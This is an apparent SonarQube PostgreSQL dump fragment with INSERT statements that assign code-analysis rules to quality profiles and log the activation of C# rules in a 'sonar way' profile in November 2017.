INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (442, 3, 1157, 2, NULL, 1510817824199, 1510817824199);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (443, 3, 1155, 2, NULL, 1510817824202, 1510817824202);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (444, 3, 1130, 2, NULL, 1510817824206, 1510817824206);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (445, 3, 1236, 3, NULL, 1510817824210, 1510817824210);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (446, 3, 1195, 3, NULL, 1510817824213, 1510817824213);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (447, 3, 1144, 3, NULL, 1510817824217, 1510817824217);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (448, 3, 1204, 4, NULL, 1510817824221, 1510817824221);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (449, 3, 1196, 2, NULL, 1510817824224, 1510817824224);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (450, 3, 1166, 1, NULL, 1510817824228, 1510817824228);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (451, 3, 1184, 2, NULL, 1510817824231, 1510817824231);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (452, 3, 1131, 2, NULL, 1510817824235, 1510817824235);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (453, 3, 1175, 3, NULL, 1510817824238, 1510817824238);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (454, 3, 1215, 1, NULL, 1510817824242, 1510817824242);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (455, 3, 1251, 2, NULL, 1510817824245, 1510817824245);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (456, 3, 1229, 1, NULL, 1510817824249, 1510817824249);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (457, 3, 1234, 0, NULL, 1510817824252, 1510817824252);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (458, 3, 1180, 2, NULL, 1510817824255, 1510817824255);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (459, 3, 1170, 2, NULL, 1510817824259, 1510817824259);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (460, 3, 1244, 1, NULL, 1510817824262, 1510817824262);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (461, 3, 1151, 2, NULL, 1510817824267, 1510817824267);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (462, 3, 1259, 0, NULL, 1510817824271, 1510817824271);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (463, 3, 1124, 3, NULL, 1510817824275, 1510817824275);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (464, 3, 1250, 2, NULL, 1510817824279, 1510817824279);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (465, 3, 1245, 2, NULL, 1510817824283, 1510817824283);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (466, 3, 1125, 2, NULL, 1510817824288, 1510817824288);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (467, 3, 1172, 3, NULL, 1510817824292, 1510817824292);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (468, 3, 1197, 1, NULL, 1510817824296, 1510817824296);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (469, 3, 1140, 3, NULL, 1510817824300, 1510817824300);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (470, 3, 1141, 2, NULL, 1510817824304, 1510817824304);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (471, 3, 1210, 2, NULL, 1510817824309, 1510817824309);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (472, 3, 1181, 2, NULL, 1510817824313, 1510817824313);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (473, 3, 1137, 4, NULL, 1510817824317, 1510817824317);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (474, 3, 1247, 3, NULL, 1510817824320, 1510817824320);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (475, 3, 1152, 3, NULL, 1510817824324, 1510817824324);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (476, 3, 1153, 4, NULL, 1510817824328, 1510817824328);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (477, 3, 1254, 2, NULL, 1510817824331, 1510817824331);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (478, 3, 1190, 2, NULL, 1510817824337, 1510817824337);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (479, 3, 1145, 2, NULL, 1510817824341, 1510817824341);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (480, 4, 1136, 2, NULL, 1510817824350, 1510817824350);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (481, 4, 1173, 2, NULL, 1510817824356, 1510817824356);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (482, 4, 1218, 2, NULL, 1510817824364, 1510817824364);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (483, 4, 1255, 3, NULL, 1510817824370, 1510817824370);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (484, 4, 1230, 4, NULL, 1510817824376, 1510817824376);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (485, 4, 1248, 2, NULL, 1510817824381, 1510817824381);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (486, 4, 1186, 2, NULL, 1510817824386, 1510817824386);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (487, 4, 1203, 3, NULL, 1510817824391, 1510817824391);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (488, 4, 1233, 3, NULL, 1510817824395, 1510817824395);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (489, 4, 1240, 3, NULL, 1510817824400, 1510817824400);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (490, 4, 1167, 3, NULL, 1510817824404, 1510817824404);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (491, 4, 1178, 3, NULL, 1510817824407, 1510817824407);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (492, 4, 1226, 2, NULL, 1510817824411, 1510817824411);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (493, 4, 1179, 3, NULL, 1510817824415, 1510817824415);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (494, 4, 1219, 3, NULL, 1510817824418, 1510817824418);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (495, 4, 1235, 3, NULL, 1510817824422, 1510817824422);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (496, 4, 1193, 2, NULL, 1510817824425, 1510817824425);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (497, 4, 1211, 3, NULL, 1510817824430, 1510817824430);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (498, 4, 1216, 2, NULL, 1510817824434, 1510817824434);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (499, 4, 1231, 3, NULL, 1510817824437, 1510817824437);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (500, 4, 1126, 4, NULL, 1510817824441, 1510817824441);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (501, 4, 1127, 2, NULL, 1510817824444, 1510817824444);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (502, 4, 1237, 3, NULL, 1510817824448, 1510817824448);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (503, 4, 1189, 2, NULL, 1510817824451, 1510817824451);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (504, 4, 1214, 3, NULL, 1510817824455, 1510817824455);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (505, 4, 1246, 3, NULL, 1510817824459, 1510817824459);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (506, 4, 1242, 4, NULL, 1510817824463, 1510817824463);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (507, 4, 1223, 3, NULL, 1510817824466, 1510817824466);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (508, 4, 1236, 3, NULL, 1510817824470, 1510817824470);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (509, 4, 1204, 4, NULL, 1510817824474, 1510817824474);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (510, 4, 1131, 2, NULL, 1510817824481, 1510817824481);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (511, 4, 1175, 3, NULL, 1510817824491, 1510817824491);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (512, 4, 1251, 2, NULL, 1510817824495, 1510817824495);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (513, 4, 1159, 4, NULL, 1510817824505, 1510817824505);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (514, 4, 1172, 3, NULL, 1510817824514, 1510817824514);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (515, 4, 1137, 4, NULL, 1510817824524, 1510817824524);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (516, 4, 1247, 3, NULL, 1510817824528, 1510817824528);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (517, 4, 1152, 3, NULL, 1510817824534, 1510817824534);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (518, 4, 1153, 4, NULL, 1510817824537, 1510817824537);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (519, 4, 1145, 2, NULL, 1510817824551, 1510817824551);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (520, 6, 103, 2, NULL, 1510818357955, 1510818357955);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (521, 6, 158, 2, NULL, 1510818358067, 1510818358067);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (522, 6, 243, 2, NULL, 1510818358176, 1510818358176);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (523, 6, 122, 2, NULL, 1510818358252, 1510818358252);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (524, 6, 129, 2, NULL, 1510818358343, 1510818358343);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (525, 6, 235, 2, NULL, 1510818358424, 1510818358424);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (526, 6, 202, 2, NULL, 1510818358550, 1510818358550);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (527, 6, 83, 2, NULL, 1510818358665, 1510818358665);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (528, 6, 922, 2, NULL, 1510818358776, 1510818358776);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (529, 6, 747, 1, NULL, 1510818358882, 1510818358882);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (530, 6, 1076, 2, NULL, 1510818358965, 1510818358965);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (531, 6, 1064, 3, NULL, 1510818359024, 1510818359024);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (532, 6, 1115, 1, NULL, 1510818359089, 1510818359089);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (533, 6, 1111, 1, NULL, 1510818359177, 1510818359177);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (534, 6, 1100, 1, NULL, 1510818359265, 1510818359265);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (535, 6, 1090, 2, NULL, 1510818359460, 1510818359460);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (536, 6, 755, 2, NULL, 1510818359569, 1510818359569);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (537, 6, 989, 2, NULL, 1510818359755, 1510818359755);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (538, 6, 1028, 1, NULL, 1510818359906, 1510818359906);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (539, 6, 954, 1, NULL, 1510818359965, 1510818359965);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (540, 6, 962, 2, NULL, 1510818360015, 1510818360015);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (541, 6, 995, 1, NULL, 1510818360087, 1510818360087);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (542, 6, 997, 2, NULL, 1510818360150, 1510818360150);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (543, 6, 978, 2, NULL, 1510818360221, 1510818360221);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (544, 6, 884, 1, NULL, 1510818360293, 1510818360293);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (545, 6, 851, 2, NULL, 1510818360362, 1510818360362);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (546, 6, 876, 1, NULL, 1510818360441, 1510818360441);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (547, 6, 878, 2, NULL, 1510818360488, 1510818360488);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (548, 6, 803, 2, NULL, 1510818360528, 1510818360528);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (549, 6, 993, 3, NULL, 1510818360596, 1510818360596);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (550, 6, 806, 2, NULL, 1510818360658, 1510818360658);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (551, 6, 1035, 2, NULL, 1510818360704, 1510818360704);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (552, 6, 1036, 1, NULL, 1510818360747, 1510818360747);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (553, 6, 1034, 2, NULL, 1510818360817, 1510818360817);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4100, 34, 103, 2, NULL, 1511237392967, 1511237392967);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4101, 34, 158, 2, NULL, 1511237393116, 1511237393116);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4102, 34, 243, 2, NULL, 1511237393221, 1511237393221);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4103, 34, 122, 2, NULL, 1511237393343, 1511237393343);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4104, 34, 129, 2, NULL, 1511237393432, 1511237393432);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4105, 34, 235, 2, NULL, 1511237393508, 1511237393508);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4106, 34, 202, 2, NULL, 1511237393585, 1511237393585);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4107, 34, 83, 2, NULL, 1511237393640, 1511237393640);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4108, 34, 922, 2, NULL, 1511237393692, 1511237393692);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4109, 34, 747, 1, NULL, 1511237393776, 1511237393776);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4110, 34, 1076, 2, NULL, 1511237393859, 1511237393859);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4111, 34, 1064, 3, NULL, 1511237393930, 1511237393930);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4112, 34, 1115, 1, NULL, 1511237394040, 1511237394040);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4113, 34, 1111, 1, NULL, 1511237394132, 1511237394132);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4114, 34, 1100, 1, NULL, 1511237394197, 1511237394197);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4115, 34, 1090, 2, NULL, 1511237394276, 1511237394276);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4116, 34, 755, 2, NULL, 1511237394366, 1511237394366);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4117, 34, 989, 2, NULL, 1511237394439, 1511237394439);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4118, 34, 1028, 1, NULL, 1511237394488, 1511237394488);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4119, 34, 954, 1, NULL, 1511237394564, 1511237394564);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4120, 34, 962, 2, NULL, 1511237394671, 1511237394671);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4121, 34, 995, 1, NULL, 1511237394749, 1511237394749);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4122, 34, 997, 2, NULL, 1511237394827, 1511237394827);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4123, 34, 978, 2, NULL, 1511237394883, 1511237394883);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4124, 34, 884, 1, NULL, 1511237394989, 1511237394989);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4125, 34, 851, 2, NULL, 1511237395067, 1511237395067);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4126, 34, 876, 1, NULL, 1511237395134, 1511237395134);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4127, 34, 878, 2, NULL, 1511237395185, 1511237395185);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4128, 34, 803, 2, NULL, 1511237395266, 1511237395266);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4129, 34, 993, 3, NULL, 1511237395355, 1511237395355);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4130, 34, 806, 2, NULL, 1511237395432, 1511237395432);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4131, 34, 1035, 2, NULL, 1511237395500, 1511237395500);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4132, 34, 1036, 1, NULL, 1511237395551, 1511237395551);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (4133, 34, 1034, 2, NULL, 1511237395599, 1511237395599);


--
-- Data for Name: activities; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1, '2017-11-16 07:37:01.826', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3244;ruleKey=csharpsquid:S3244;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnR_bbGRdfPp-qcv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2, '2017-11-16 07:37:01.846', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3236;ruleKey=csharpsquid:S3236;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnSWbbGRdfPp-qcw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3, '2017-11-16 07:37:01.853', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2306;ruleKey=csharpsquid:S2306;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnSdbbGRdfPp-qcx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4, '2017-11-16 07:37:01.862', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3168;ruleKey=csharpsquid:S3168;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnSmbbGRdfPp-qcy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (5, '2017-11-16 07:37:01.872', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1764;ruleKey=csharpsquid:S1764;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnSwbbGRdfPp-qcz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (6, '2017-11-16 07:37:01.879', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1940;ruleKey=csharpsquid:S1940;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnS3bbGRdfPp-qc0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (7, '2017-11-16 07:37:01.884', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2486;ruleKey=csharpsquid:S2486;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnS8bbGRdfPp-qc1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (8, '2017-11-16 07:37:01.896', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1118;ruleKey=csharpsquid:S1118;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTIbbGRdfPp-qc2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (9, '2017-11-16 07:37:01.903', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1155;ruleKey=csharpsquid:S1155;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTPbbGRdfPp-qc3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (10, '2017-11-16 07:37:01.908', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2971;ruleKey=csharpsquid:S2971;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTUbbGRdfPp-qc4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (11, '2017-11-16 07:37:01.915', NULL, 'key=cs-sonar-way-07093:csharpsquid:S125;ruleKey=csharpsquid:S125;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTbbbGRdfPp-qc5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (12, '2017-11-16 07:37:01.919', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1134;ruleKey=csharpsquid:S1134;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTfbbGRdfPp-qc6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (13, '2017-11-16 07:37:01.932', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1135;ruleKey=csharpsquid:S1135;profileKey=cs-sonar-way-07093;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTrbbGRdfPp-qc7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (14, '2017-11-16 07:37:01.936', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1862;ruleKey=csharpsquid:S1862;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnTwbbGRdfPp-qc8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (15, '2017-11-16 07:37:01.941', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1871;ruleKey=csharpsquid:S1871;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnT0bbGRdfPp-qc9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (16, '2017-11-16 07:37:01.964', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1699;ruleKey=csharpsquid:S1699;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnUMbbGRdfPp-qc-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (17, '2017-11-16 07:37:01.977', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1854;ruleKey=csharpsquid:S1854;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnUZbbGRdfPp-qc_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (18, '2017-11-16 07:37:01.981', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3172;ruleKey=csharpsquid:S3172;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnUdbbGRdfPp-qdA');
